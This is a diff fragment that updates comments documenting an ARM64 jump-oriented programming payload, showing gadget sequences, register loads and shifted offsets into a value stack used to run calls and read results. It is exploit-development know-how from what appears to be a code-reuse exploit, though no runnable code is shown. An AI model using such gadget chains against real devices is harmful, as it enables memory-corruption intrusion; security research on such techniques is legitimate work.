@@ -212,13 +212,13 @@
  * 	pc = LDP_X8_X1_X20_10__BLR_X8
  *
  * ldp x8, x1, [x20, #0x10] ; blr x8
- * 	x8 = VALUE_STACK[e0] = JOP_DISPATCH
- * 	x1 = VALUE_STACK[e8] = JOP_STACK
+ * 	x8 = VALUE_STACK[ac] = JOP_DISPATCH
+ * 	x1 = VALUE_STACK[b4] = JOP_STACK
  * 	pc = JOP_DISPATCH
  * 	pc = STR_X0_X20__LDR_X8_X22__LDR_X8_X8_28__MOV_X0_X22__BLR_X8
  *
  * str x0, [x20] ; ldr x8, [x22] ; ldr x8, [x8, #0x28] ; mov x0, x22 ; blr x8
- * 	VALUE_STACK[d0] = <result>
+ * 	VALUE_STACK[9c] = <result>
  * 	x8 = STORE_RESUME[0] = STORE_RESUME+8-28
  * 	x8 = (STORE_RESUME+8-28)[28] = JOP_DISPATCH
  * 	x0 = STORE_RESUME
@@ -287,7 +287,7 @@
  * 	+---------+
  *
  * Thus, the part of the JOP payload that varies is VALUE_STACK+0x54 to VALUE_STACK+0xdc, and the
- * result can be read from VALUE_STACK+0xd0.
+ * result can be read from VALUE_STACK+0x9c.
  *
  * STORE_RESUME is used to resume execution of the JOP_STACK after the store gadget:
  *
